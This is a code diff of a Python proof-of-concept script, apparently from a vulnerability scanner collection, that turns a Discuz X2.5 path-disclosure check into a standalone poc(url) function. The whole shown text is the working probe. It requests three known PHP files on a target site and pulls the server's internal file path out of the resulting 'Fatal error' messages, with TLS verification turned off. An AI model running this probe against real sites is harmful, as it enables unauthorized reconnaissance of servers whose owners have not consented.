@@ -12,31 +12,23 @@ import requests
 import warnings
 
 
-class discuz_x25_path_disclosure_BaseVerify:
-    def __init__(self, url):
-        self.url = url
 
-    def run(self):
-        headers = {
-            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
-        }
-        payloads = ["/uc_server/control/admin/db.php",
-                    "/source/plugin/myrepeats/table/table_myrepeats.php",
-                    "/install/include/install_lang.php"]
-        try:
-            for payload in payloads:
-                vulnurl = self.url + payload
-                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
-                pattern = re.search('Fatal error.* in <b>([^<]+)</b> on line <b>(\d+)</b>', req.text)
-                if pattern:
-                    return {'payload': vulnurl, 'post_data': '', 'info': '', 'extra':pattern.group(1)}
-                else:
-                    pass
+def poc(url):
+    headers = {
+        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
+    }
+    payloads = ["/uc_server/control/admin/db.php",
+                "/source/plugin/myrepeats/table/table_myrepeats.php",
+                "/install/include/install_lang.php"]
+    try:
+        for payload in payloads:
+            vulnurl = url + payload
+            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
+            pattern = re.search('Fatal error.* in <b>([^<]+)</b> on line <b>(\d+)</b>', req.text)
+            if pattern:
+                return {'payload': vulnurl, 'post_data': '', 'info': '', 'extra':pattern.group(1)}
+            else:
+                pass
 
-        except:
-            pass
-
-if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
-    testVuln = discuz_x25_path_disclosure_BaseVerify(sys.argv[1])
-    testVuln.run()
+    except:
+        pass
